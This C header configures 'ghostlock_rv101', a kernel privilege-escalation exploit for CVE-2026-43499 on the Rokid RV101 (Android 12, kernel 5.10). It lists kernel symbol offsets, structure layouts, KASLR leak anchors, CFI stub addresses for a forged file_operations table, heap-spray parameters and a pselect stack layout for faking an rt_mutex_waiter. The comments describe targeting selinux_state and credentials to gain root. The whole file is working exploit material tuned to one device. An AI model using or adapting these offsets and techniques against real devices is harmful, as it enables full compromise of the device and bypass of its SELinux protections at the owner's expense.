/*
 * ghostlock_rv101 — CVE-2026-43499 (GhostLock) root exploit for Rokid RV101
 * ("neo", Android 12, kernel 5.10.209-perf-gd908d71a0404-ab1.22.009).
 *
 * Every offset below was derived from static analysis (kallsyms + capstone
 * disassembly) of binaries/extracted_1.22/kernel and cross-checked against the
 * runtime leak data. Do not edit blindly.
 */
#ifndef TARGET_RV101_H
#define TARGET_RV101_H

#ifndef _GNU_SOURCE
#define _GNU_SOURCE
#endif
#include <stdint.h>
#include <sys/select.h>

#define BUILD_VARIANT_LABEL "ghostlock_rv101"
#define BUILD_FINGERPRINT   "rokid/ghostlock/rv101"

/* ---- Address space ----------------------------------------------------- */
/* Runtime kernel image VA = KIMAGE_TEXT_BASE + slide; slide leaked via
 * /sys/kernel/tracing/printk_formats (readable by shell: gid readtracefs).
 * VA_BITS = 39 (leaked mm_struct linear addresses at 0xffffff80..:
 * linear map = 0xffffff8000000000..0xffffffc000000000, kernel image region
 * = 0xffffffc0..0xffffffff). */
#define KIMAGE_TEXT_BASE   0xffffffc008000000ULL
#define P0_PAGE_OFFSET     0xffffff8000000000ULL   /* linear map base */
#define P0_PHYS_OFFSET     0x0000000080000000ULL   /* /proc/zoneinfo start_pfn=524288 */
/* v9.30: the kernel Image header (text_offset @ +0x08) says 0x0 — with
 * CONFIG_RELOCATABLE the arm64 build uses TEXT_OFFSET=0 and the bootloader
 * places the Image at the RAM base (zoneinfo start_pfn=524288 → 0x80000000;
 * no memstart seed). The previous 0x80800000 (PHYS_OFFSET + 0x800000)
 * misapplied the 64KB-page TEXT_OFFSET and pushed every data_addr() alias
 * +0x800000 — the W1 write landed 8MB past selinux_state (run 49/50). */
#define P0_KERNEL_PHYS_LOAD 0x0000000080000000ULL  /* PHYS_OFFSET + text_offset(0) */

#define KERNELSNITCH_IDENTITY_START 0xffffff8000000000ULL
#define KERNELSNITCH_IDENTITY_END   0xffffff8100000000ULL  /* scan first 4GB of RAM */
#define DIRECT_MAP_BASE KERNELSNITCH_IDENTITY_START
#define DIRECT_MAP_END   KERNELSNITCH_IDENTITY_END

/* ---- Global symbols (link-time, offsets from KIMAGE_TEXT_BASE) ---------- */
/* v9.29: re-derived from rv101_kallsyms.txt (authoritative for the 1.22.009
 * device kernel). The previous offsets were all +0x28000000 off (computed
 * as if the base were 0x08000000): init_task 0xffffffc00a1eb840,
 * init_cred 0xffffffc00a202058, selinux_state 0xffffffc00aca0140,
 * root_task_group 0xffffffc00aa71040. */
#define INIT_TASK_OFF       0x021eb840ULL
#define INIT_CRED_OFF       0x02202058ULL
#define ROOT_TASK_GROUP_OFF 0x02a71040ULL   /* root_task_group (from kallsyms) */
#define SELINUX_STATE_OFF   0x02ca0140ULL   /* selinux_state; enforcing @ +0 */
#define DMESG_RESTRICT_OFF  0x02a72d50ULL   /* dmesg_restrict (B); write-probe target */
#define KPTR_RESTRICT_OFF   0x021dac20ULL   /* kptr_restrict (D); write-probe target */

/* printk_formats leak anchors: string -> file offset in the Image */
#define PF_STR_RESCHED_OFF 0x1c2ac0cULL   /* "Rescheduling interrupts" */
#define PF_STR_FUNCALL_OFF 0x1cca100ULL   /* "Function call interrupts" */

#define SELINUX_STATE (KIMAGE_TEXT_BASE + SELINUX_STATE_OFF)
#define INIT_TASK     (KIMAGE_TEXT_BASE + INIT_TASK_OFF)
#define INIT_CRED     (KIMAGE_TEXT_BASE + INIT_CRED_OFF)
#define ROOT_TASK_GROUP (KIMAGE_TEXT_BASE + ROOT_TASK_GROUP_OFF)

/* ---- task_struct offsets (disasm-verified: remove_waiter/commit_creds/
 *      rt_mutex_adjust_prio_chain/__sched_setscheduler) ------------------- */
#define TASK_USAGE_OFF        0x40
#define TASK_PRIO_OFF         0x84
#define TASK_NORMAL_PRIO_OFF  0x8c
#define TASK_DL_DEADLINE_OFF  0x360
#define TASK_REAL_CRED_OFF    0x778
#define TASK_CRED_OFF         0x780
#define TASK_PI_LOCK_OFF      0x85c
#define TASK_PI_WAITERS_OFF   0x870   /* rb_root (rb_node) */
#define TASK_PI_WAITERS_LM_OFF 0x878  /* rb_leftmost */
#define TASK_PI_TOP_TASK_OFF  0x880
#define TASK_PI_BLOCKED_ON_OFF 0x888
/* v9.31 (W2 task-list walk; disasm-verified: __arm64_sys_kill walk @ init_task
 * +0x4c8, __get_task_comm/__set_task_comm read/write comm @ +0x790) */
#define TASK_TASKS_OFF        0x4c8   /* list_head tasks (init_task walk) */
#define TASK_COMM_OFF         0x790   /* char comm[TASK_COMM_LEN]; CONFIG_KEYS
                                       * puts cached_requested_key @ 0x788 */
/* v9.31: raw pid/tgid (disasm-verified: copy_process CLONE_THREAD branch does
 * p->group_leader(0x608) = current->group_leader; p->tgid(0x5cc) = current->tgid;
 * p->pid(0x5c8) = pid_nr(pid)). Prefer tgid matching over comm in the task walk. */
#define TASK_PID_OFF          0x5c8   /* pid_t pid */
#define TASK_TGID_OFF         0x5cc   /* pid_t tgid */

/* ---- rt_mutex_waiter offsets (disasm-verified) -------------------------- */
#define WAITER_TREE_ENTRY_OFF  0x00   /* rb_node */
#define WAITER_PI_TREE_ENTRY_OFF 0x18 /* rb_node */
#define WAITER_TASK_OFF        0x30
#define WAITER_LOCK_OFF        0x38
#define WAITER_PRIO_OFF        0x40   /* int */
#define WAITER_DEADLINE_OFF    0x48   /* u64 */

/* ---- rt_mutex offsets (disasm-verified) --------------------------------- */
#define RTMUTEX_WAIT_LOCK_OFF  0x00   /* u32 */
#define RTMUTEX_WAITERS_OFF    0x08   /* rb_root */
#define RTMUTEX_WAITERS_LM_OFF 0x10   /* rb_leftmost */
#define RTMUTEX_OWNER_OFF      0x18

/* ---- W2 FOPS route (v9.31 prep — symbols & offsets kallsyms/Image-dump
 *      verified 2026-08-20; CODE NOT YET WIRED IN, do not rely on in build)
 * ---------------------------------------------------------------------------
 * The RV101 kernel is built with Clang kCFI + LTO: every fops table stores
 * ".cfi_jt" jump-table stubs (NOT direct function addresses) and indirect
 * calls go through those stubs, so a fake file_operations table must carry
 * the REAL cfi_jt stub addresses below (never the raw T/t function VAs).
 *
 * IMPORTANT corrections vs. earlier handoffs:
 *   - ashmem_misc.fops is at +0x10 (struct miscdevice {int minor; const
 *     char *name; const struct file_operations *fops; ...}) — NOT +0x18.
 *   - configfs uses .read/.write (0x10/0x18), NOT .read_iter/.write_iter.
 * ------------------------------------------------------------------------ */
#define ASHMEM_FOPS_OFF          0x01e977a8ULL  /* d ashmem_fops */
#define ASHMEM_MISC_OFF          0x029bcbb0ULL  /* d ashmem_misc (miscdevice) */
#define ASHMEM_MISC_FOPS_OFF     0x10            /* miscdevice.fops offset */
/* try_module_get(owner) reads refcnt @ owner+0x3c8. owner=(fops-8)|1=
 * ashmem_misc+0x09, so refcnt = *(u32*)@0x29bcf81 (padding past
 * sun6i_msgbox_driver) = 0 at runtime -> open fails -ENODEV. A second rb_erase
 * write pokes this u32 non-zero so the open succeeds. */
#define REFCNT_FIX_OFF           0x029bcf81ULL
#define CONFIGFS_FOPS_OFF        0x01d46840ULL  /* D configfs_file_operations */
#define CONFIGFS_BIN_FOPS_OFF    0x01d46960ULL  /* D configfs_bin_file_ops */
#define COMMIT_CREDS_OFF         0x0018b328ULL
#define PREPARE_KERNEL_CRED_OFF  0x0018ba9cULL

/* file_operations member offsets (dumped from ashmem_fops/configfs_*_fops) */
#define FOPS_LLSEEK_OFF          0x008
#define FOPS_READ_OFF            0x010
#define FOPS_WRITE_OFF           0x018
#define FOPS_READ_ITER_OFF       0x020
#define FOPS_WRITE_ITER_OFF      0x028
#define FOPS_IOCTL_OFF           0x050   /* unlocked_ioctl */
#define FOPS_COMPAT_IOCTL_OFF    0x058
#define FOPS_MMAP_OFF            0x060
#define FOPS_OPEN_OFF            0x070
#define FOPS_RELEASE_OFF         0x080
#define FOPS_SHOW_FDINFO_OFF     0x0e0

/* ashmem SET_NAME blob -> configfs_buffer overlay (disasm-verified 2026-08-20
 * from configfs_read_bin_file@0x49ec40 / configfs_write_bin_file@0x49ee00).
 * file->private_data is @ 0xd8; the driver prepends "dev/ashmem/" (11 bytes)
 * to the SET_NAME string, so configfs_buffer offset X sits at blob[X-11].
 * configfs_write_bin_file: simple_write_to_buffer(bin_buffer, .., ppos, ..);
 * configfs_read_bin_file : simple_read_from_buffer(buf, .., ppos, bin_buffer,
 *                          bin_buffer_size) when needs_read_fill==0. */
#define ASHMEM_NAME_PREFIX_LEN   11
#define CFG_BIN_BUFFER_OFF       0x58   /* char *bin_buffer (rw target) */
#define CFG_BIN_BUFFER_SIZE_OFF  0x60   /* int bin_buffer_size */
#define CFG_CB_MAX_SIZE_OFF      0x64   /* int cb_max_size (0 avoids realloc) */
#define CFG_NEEDS_READ_FILL_OFF  0x50   /* int; 0 => skip item-ops fill */

/* cfi_jt stub addresses (what a fake fops table must actually store) */
#define CFI_NOOP_LLSEEK_OFF      0x0121ab88ULL
#define CFI_ASHMEM_LLSEEK_OFF    0x0121abf0ULL
#define CFI_ASHMEM_SHOW_FDINFO_OFF 0x0121cd20ULL
#define CFI_ASHMEM_MMAP_OFF      0x0122a630ULL
#define CFI_ASHMEM_READ_ITER_OFF 0x01236ce8ULL
#define CFI_CONFIGFS_WRITE_FILE_OFF 0x01238550ULL
#define CFI_CONFIGFS_WRITE_BIN_OFF 0x01238670ULL
#define CFI_CONFIGFS_READ_BIN_OFF 0x01238e20ULL
#define CFI_CONFIGFS_READ_FILE_OFF 0x01239168ULL
#define CFI_ASHMEM_COMPAT_IOCTL_OFF 0x0123e0b8ULL
#define CFI_ASHMEM_IOCTL_OFF     0x0123e118ULL
#define CFI_ASHMEM_RELEASE_OFF   0x0123ef48ULL
#define CFI_CONFIGFS_RELEASE_BIN_OFF 0x0123f1a8ULL
#define CFI_ASHMEM_OPEN_OFF      0x0123fb70ULL
#define CFI_CONFIGFS_OPEN_BIN_OFF 0x0123fd80ULL

/* ---- pselect stack layout (disasm-verified) ------------------------------
 * el0_svc -> __arm64_sys_pselect6 (frame 0xa0) -> core_sys_select (0x1c0),
 * stack_fds @ core_sys_select_sp+0x50.
 * futex path: __arm64_sys_futex (0x70) -> do_futex (0x60) ->
 * futex_wait_requeue_pi (0x1a0), rt_waiter @ sp+0x90.
 * => rt_waiter = stack_fds + 0x30.
 * With nfds=320 (size 40, words_per_set 5):
 *   waiter+0x00 (tree.pc)    = out w1    waiter+0x28 (pi.left)    = ex w1
 *   waiter+0x08 (tree.right) = out w2    waiter+0x30 (task)       = ex w2
 *   waiter+0x10 (tree.left)  = out w3    waiter+0x38 (lock)       = ex w3
 *   waiter+0x18 (pi.pc)      = out w4    waiter+0x40 (prio/dead)  = ex w4
 *   waiter+0x20 (pi.right)   = ex  w0
 * (deadline/ww_ctx are zeroed by the stack_fds memset at fn entry)
 */
#define PSELECT_ROUTE_NFDS 320
#define PSELECT_WORDS_PER_SET 5
/* global fd_set word = set*5 + word (in:0-4, out:5-9, ex:10-14) */
#define PWS_TREE_PC      (5 + 1)   /* out w1: tree_entry.parent_color */
#define PWS_TREE_RIGHT   (5 + 2)   /* out w2: tree_entry.right */
#define PWS_TREE_LEFT    (5 + 3)   /* out w3: tree_entry.left */
#define PWS_PI_PC        (5 + 4)   /* out w4: pi_tree_entry.parent_color */
#define PWS_PI_RIGHT     (10 + 0)  /* ex w0: pi_tree_entry.right */
#define PWS_PI_LEFT      (10 + 1)  /* ex w1: pi_tree_entry.left */
#define PWS_TASK         (10 + 2)  /* ex w2: waiter->task */
#define PWS_LOCK         (10 + 3)  /* ex w3: waiter->lock */
#define PWS_PRIO         (10 + 4)  /* ex w4: waiter->prio | deadline-lo */

#define FAKE_TASK_PRIO   120
#define FAKE_WAITER_PRIO 130

/* ---- Fake kernel page layout (sprayed into reclaimed order-3 slab) ------- */
#define LOCK_OFF      0x0E00
#define W0_OFF        0x1000
#define FAKE_TASK_OFF 0x1200
#define SCRATCH_OFF   0x1300
#define CRED_COPY_OFF 0x1400
#define SAFE_OFF      0x1500   /* W1 child node: low byte 0x00 */
#define FOPS_OFF      0x1600   /* fake file_operations table (W2 FOPS route) */

/* ---- Exploit tuning ----------------------------------------------------- */
#define CORE           0
#define CONSUMER_CORE  (CORE + 1)
/* RV101 slabinfo: mm_struct objsize=960 (0x3C0), objperslab=17,
 * pagesperslab=4 => order-2 (16KB) slab! */
#define MM_STRUCT_SZ     0x3C0
#define MM_ORDER         2
#define ORDER2_SIZE      (PAGE_SIZE << MM_ORDER)   /* 16KB slab */
#define SKB_SEND_SIZE    (ORDER2_SIZE - 0x200)     /* stay in kmalloc-16k */
#define SKB_RECLAIM_SENDS 768
/* v9 reclaim: memfd-pinned flood (the v2 flow that empirically moved the
 * leak slab onto the node partial list) + IMMEDIATE leak-memfd close (no
 * 1.5s settle — the settle is what let the system consume the node-partial
 * slabs and starve the slab_empty discard gate in v2). The flood memfd
 * closes pump the per-CPU chain -> drain -> non-empty leak slab lands on
 * node partial -> the immediate close hits the nr_partial>=min_partial(5)
 * gate -> discard straight to the buddy -> SKB vehicles take it.
 */
#define GHOSTLOCK_KEEPERS       0
/* SKB data lands at block+0 in the reclaimed slab (no key payload header) */
#define SKB_DATA_DELTA 0
#define KSNITCH_COLLISIONS 4
#define KERNELSNITCH_THRESHOLD_MULT 10
#define MM_PARTIALS      12
#define KERNEL_PAGE_SETUP_ATTEMPTS 12
#define CONSUMER_MAX_CALLS 1
#define PSELECT_CONSUMER_NICE 19
#define PSELECT_ENTER_DELAY_USEC 20000
#define PSELECT_TIMEOUT_USEC 200000
#define ROUTE_WAIT_SECONDS 1
#define FOPS_ATTEMPTS     6

#define TASK_COMM_LEN 16

/* ---- pselect fd_set helpers --------------------------------------------- */
static inline void fdset_put_word(fd_set *set, int word, uint64_t value) {
  ((unsigned long *)set)[word] = (unsigned long)value;
}
static inline uint64_t fdset_get_word(const fd_set *set, int word) {
  return ((const unsigned long *)set)[word];
}

#endif
